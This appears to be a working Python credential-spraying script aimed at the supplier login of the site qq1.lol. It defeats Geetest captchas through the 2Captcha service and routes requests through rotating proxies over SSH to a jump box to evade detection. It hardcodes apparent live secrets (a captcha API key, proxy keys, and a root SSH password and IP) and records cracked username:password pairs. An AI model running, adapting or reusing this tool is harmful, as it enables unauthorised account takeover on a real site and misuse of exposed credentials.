#!/usr/bin/env python3
"""qq1.lol sup brute — 2Captcha Geetest + QG proxy via jump box"""
import json
import os
import shlex
import subprocess
import time
from datetime import datetime
from pathlib import Path

import requests

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/data/automation/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
WORKER = os.environ.get("SUP_WORKER", "0")
LOG = OUT / f"sup_2captcha_w{WORKER}.log"
HITS = OUT / "sup_hits.txt"
PROGRESS = OUT / f"sup_2captcha_progress_w{WORKER}.json"
JAR = str(OUT / f".sup_cookies_w{WORKER}")

CAPTCHA2_KEY = os.environ.get("CAPTCHA2_KEY", "685ea1068774ca8f8e9a292a08da66d6")
QG_KEY = os.environ.get("QG_AUTHKEY", "C413ED6D")
QG_PWD = os.environ.get("QG_AUTHPWD", "344F550A6F8B")
JP_PASS = "DX4LmrDaPfd9"
JP_HOST = "42.240.167.114"
PAGE_URL = f"{BASE}/sup/login.php"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"

USERS = os.environ.get("SUP_USERS", "admin,buyi,buyiq,root,test,sup,supplier,布衣,qq1").split(",")
PASSWORDS = [
    "admin", "123456", "123456789", "admin123", "admin888", "buyi", "buyiq",
    "qq1", "qq123456", "password", "111111", "666666", "888888", "123123",
    "admin@123", "Admin123", "a123456", "1234567890", "admin666", "buyi123",
    "buyi888", "qqkqq", "830603", "123456789s", "root", "test123", "qwerty",
    "admin2024", "admin2025", "admin2026", "ruoyi123", "buyi2026",
    "12345678", "654321", "abc123", "password1", "admin@888", "qq1.lol",
]
SPRAY_DELAY = float(os.environ.get("SUP_SPRAY_DELAY", "0.08"))
CAPTCHA_POLL = int(os.environ.get("CAPTCHA2_POLL", "5"))
CAPTCHA_TIMEOUT = int(os.environ.get("CAPTCHA2_TIMEOUT", "120"))

_proxy_cache = None


def log(msg):
    line = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def load_progress():
    if PROGRESS.exists():
        try:
            return json.loads(PROGRESS.read_text())
        except Exception:
            pass
    return {"user_idx": 0, "pwd_idx": 0}


def save_progress(ui, pi):
    PROGRESS.write_text(json.dumps({"user_idx": ui, "pwd_idx": pi}))


def get_proxy():
    global _proxy_cache
    if _proxy_cache:
        return _proxy_cache
    try:
        r = subprocess.run(
            ["curl", "-s", f"https://share.proxy.qg.net/get?key={QG_KEY}&num=1"],
            capture_output=True, text=True, timeout=15,
        )
        data = json.loads(r.stdout)
        if data.get("code") == "SUCCESS":
            srv = data["data"][0]["server"]
            _proxy_cache = f"http://{QG_KEY}:{QG_PWD}@{srv}"
            return _proxy_cache
    except Exception:
        pass
    return None


def qg_curl(url, method="GET", post=None):
    proxy = get_proxy()
    parts = ["curl", "-sk", "--max-time", "20", "-b", JAR, "-c", JAR, "-A", UA,
             "-H", f"Referer: {PAGE_URL}"]
    if proxy:
        parts[2:2] = ["-x", proxy]
    if method == "POST":
        parts += ["-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded"]
        if post:
            parts += ["-d", post]
    parts.append(url)
    inner = " ".join(shlex.quote(p) for p in parts)
    cmd = ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP_HOST}", inner]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=35)
        return r.stdout.strip()
    except Exception as e:
        return ""


def get_geetest_challenge():
    body = qg_curl(f"{BASE}/ajax.php?act=captcha&t={int(time.time()*1000)}")
    if not body:
        raise RuntimeError("captcha fetch empty")
    d = json.loads(body)
    if not d.get("gt") or not d.get("challenge"):
        raise RuntimeError(f"bad captcha: {d}")
    return d


def solve_2captcha(gt, challenge):
    t0 = time.time()
    r = requests.post(
        "https://api.2captcha.com/createTask",
        json={
            "clientKey": CAPTCHA2_KEY,
            "task": {
                "type": "GeeTestTaskProxyless",
                "websiteURL": PAGE_URL,
                "gt": gt,
                "challenge": challenge,
            },
        },
        timeout=30,
    )
    data = r.json()
    if data.get("errorId"):
        raise RuntimeError(f"2captcha create: {data}")
    task_id = data["taskId"]
    log(f"  2captcha task={task_id}")

    deadline = time.time() + CAPTCHA_TIMEOUT
    while time.time() < deadline:
        time.sleep(CAPTCHA_POLL)
        r = requests.post(
            "https://api.2captcha.com/getTaskResult",
            json={"clientKey": CAPTCHA2_KEY, "taskId": task_id},
            timeout=30,
        )
        data = r.json()
        if data.get("errorId"):
            raise RuntimeError(f"2captcha poll: {data}")
        if data.get("status") == "ready":
            sol = data["solution"]
            geo = {
                "c": sol.get("challenge", challenge),
                "v": sol.get("validate", ""),
                "s": sol.get("seccode", ""),
            }
            log(f"  solved in {time.time()-t0:.0f}s validate={geo['v'][:16]}...")
            return geo
    raise RuntimeError("2captcha timeout")


def api_login(user, pwd, geo):
    post = "&".join([
        f"user={user}", f"pass={pwd}",
        f"geetest_challenge={geo['c']}",
        f"geetest_validate={geo['v']}",
        f"geetest_seccode={requests.utils.quote(geo['s'], safe='')}",
    ])
    body = qg_curl(f"{BASE}/sup/ajax.php?act=login", "POST", post)
    if not body:
        return {"msg": "empty"}
    try:
        return json.loads(body)
    except Exception:
        return {"raw": body[:100]}


def try_user(user, start_pi=0):
    global _proxy_cache
    while start_pi < len(PASSWORDS):
        log(f"--- {user} pwd_idx={start_pi} ---")
        try:
            _proxy_cache = None  # fresh proxy per captcha batch
            qg_curl(PAGE_URL)  # init cookies
            cap = get_geetest_challenge()
            geo = solve_2captcha(cap["gt"], cap["challenge"])
        except Exception as e:
            log(f"  captcha err: {e}")
            time.sleep(8)
            continue

        for pi, pwd in enumerate(PASSWORDS[start_pi:], start_pi):
            resp = api_login(user, pwd, geo)
            code = resp.get("code")
            msg = resp.get("msg", "")
            if code == 0:
                log(f"*** HIT {user}:{pwd} ***")
                with open(HITS, "a") as f:
                    f.write(f"{user}:{pwd}\n")
                return True
            if "密码" in msg and "空" not in msg:
                log(f"  {user}:{pwd} -> wrong_pwd")
            elif "验证" in msg:
                log(f"  {user}:{pwd} -> captcha_expired")
                save_progress(USERS.index(user), pi)
                return try_user(user, pi)
            else:
                log(f"  {user}:{pwd} -> {msg[:50]}")
            save_progress(USERS.index(user), pi + 1)
            time.sleep(SPRAY_DELAY)
        return False
    return False


def main():
    prog = load_progress()
    ui_start = prog["user_idx"]
    log(f"=== sup 2captcha w{WORKER} users={USERS} ===")
    qg_curl(PAGE_URL)
    for ui in range(ui_start, len(USERS)):
        user = USERS[ui]
        start_pi = prog["pwd_idx"] if ui == ui_start else 0
        if try_user(user, start_pi):
            return
    log("=== done no hit ===")


if __name__ == "__main__":
    main()
